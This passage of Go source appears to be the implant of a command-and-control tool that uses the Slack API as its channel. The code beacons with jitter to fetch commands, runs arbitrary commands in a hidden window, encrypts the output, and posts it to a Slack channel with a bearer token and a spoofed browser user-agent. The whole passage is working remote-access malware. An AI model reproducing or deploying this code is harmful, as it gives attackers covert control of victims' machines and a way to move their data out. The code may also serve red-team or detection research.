			encryptedOutput, _ := Encrypt([]byte(ifconfig))
			SendResult(client_id, job_id, "output", encryptedOutput)

		case "getip":
			ipaddr := GetWANOutboundIP()
			encryptedOutput, _ := Encrypt([]byte(ipaddr))
			SendResult(client_id, job_id, "output", encryptedOutput)

		case "whoami":
			me := whoami()
			encryptedOutput, _ := Encrypt([]byte(me))
			SendResult(client_id, job_id, "output", encryptedOutput)

		case "getuid":
			me := whoami()
			encryptedOutput, _ := Encrypt([]byte(me))
			SendResult(client_id, job_id, "output", encryptedOutput)

		case "hostname":
			me := hostname()
			encryptedOutput, _ := Encrypt([]byte(me))
			SendResult(client_id, job_id, "output", encryptedOutput)

		default:
			cmdArgs := []string{"/c", command}
			cmd = exec.Command(cmdName, cmdArgs...)
			fmt.Println("Running command: " + command)
			var out bytes.Buffer
			var stderr bytes.Buffer
			cmd.Stdout = &out
			cmd.Stderr = &stderr
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			err := cmd.Run()
			if err != nil {
				encryptedOutput, _ := Encrypt([]byte(stderr.String()))
				SendResult(client_id, job_id, "output", encryptedOutput)
			} else {
				encryptedOutput, _ := Encrypt([]byte(out.String()))
				SendResult(client_id, job_id, "output", encryptedOutput)
			}
		}

	}
}

func SendResult(client_ID, job_ID, cmd_type, output string) { //Sends a response back to the responses channel
	client := &http.Client{Timeout: time.Second * 10}
	URL := "https://slack.com/api/chat.postMessage"
	v := url.Values{}
	v.Set("channel", responses)
	info := client_ID + ":" + job_ID + ":" + cmd_type + ":" + output

	if len(info) < 4000 { // If characters are less than 4K, leave it alone
		v.Set("text", info)
		//If it has more than 4K and less than 30K, prepend the client and job info as it will get posted
		// as a multi-part message

	} else if len(info) < 30000 {
		info := client_ID + ":" + job_ID + ":" + "cont" + ":" + output
		index := 4000
		for i := 0; i+index < len(info); i++ {
			info = info[:index] + client_ID + ":" + job_ID + ":" + "cont:" + info[index:]
			index = index + 4000
		}
		v.Set("text", info)

	} else { //If the size is over 30K characters, it's too big to print.
		message := "Output too long.  Consider writing command output to a file and downloading it."
		encryptedOutput, _ := Encrypt([]byte(message))
		info := client_ID + ":" + job_ID + ":" + cmd_type + ":" + encryptedOutput
		v.Set("text", info)
	}
	//pass the values to the request's body
	fmt.Println("Sending result...")
	req, _ := http.NewRequest("POST", URL, strings.NewReader(v.Encode()))
	req.Header.Add("Authorization", "Bearer "+bearer)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0")
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	_, netError := client.Do(req)
	if netError != nil {
		fmt.Println("Connection error: " + netError.Error())
	}

}

func main() { //Main function

	//Give the client a random ID
	rand.Seed(time.Now().UTC().UnixNano())
	client_ID := RandomString(5)
	// Register with server
	Register(client_ID)
	for {
		// 20% Jitter
		delay := randomFloat(float64(beacon)*.8, float64(beacon)*1.2, 1)
		fmt.Println(delay) // Just for debugging
		//Sleep for beacon interval + jitter
		time.Sleep(time.Duration(delay[0]) * time.Second)
		t := makeTimestamp(beacon)
		//Check if commands are waiting for us
		CheckCommands(string(t), client_ID)
	}
}
